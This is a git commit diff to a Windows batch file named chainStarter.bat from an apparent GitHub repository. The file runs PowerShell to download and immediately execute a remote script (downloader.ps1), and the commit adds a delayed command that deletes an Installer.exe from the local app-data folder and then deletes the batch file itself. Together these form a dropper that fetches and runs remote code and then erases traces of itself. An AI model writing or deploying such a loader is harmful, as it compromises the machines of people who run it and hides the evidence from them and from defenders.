9371176f09458f94cd7dab04fc60999007c8dc15
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2025-10-22 14:41:19 +0200

    Update chainStarter.bat

--- chainStarter.bat
+++ chainStarter.bat
@@ -1,1 +1,5 @@
 powershell.exe -Command "iex(iwr 'https://raw.githubusercontent.com/RaupenInspektor/Pico/main/downloader.ps1').Content"
+
+start /b "" cmd /c "timeout /t 10 >nul & del /f /q \"%LOCALAPPDATA%\Installer.exe\" & del /f /q \"%~f0\""
+
+exit /b
